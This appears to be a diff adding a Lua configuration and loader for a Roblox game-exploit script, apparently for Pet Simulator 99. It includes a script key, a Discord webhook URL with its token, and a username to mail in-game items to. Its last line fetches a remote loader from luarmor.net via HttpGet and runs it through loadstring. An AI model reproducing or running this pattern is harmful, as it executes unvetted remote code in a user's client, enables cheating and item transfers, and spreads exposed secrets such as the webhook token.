@@ -1,1 +1,12 @@
+script_key="QZInoQcTAFyujYcLPztFZPZyvepvXoCi";
 
+getgenv().ps99Config = {
+    -- General Config
+    HIDE_NAME = false,
+    DISCORD_ID = "683191935623495686",
+
+    -- Mail Config
+    USERNAME_TO_MAIL = "nklx64",
+    MAILING_WEBHOOK_URL = "https://discord.com/api/webhooks/1221707846052216954/VMHH_Vk1zWlouYJcmF8JAGZEV-o4lu35obGTac9BwG2qnyDW7piwG6UFMJSx3DrtnfEm",
+}
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/627e09df17480561c1878d1537a1b612.lua"))()
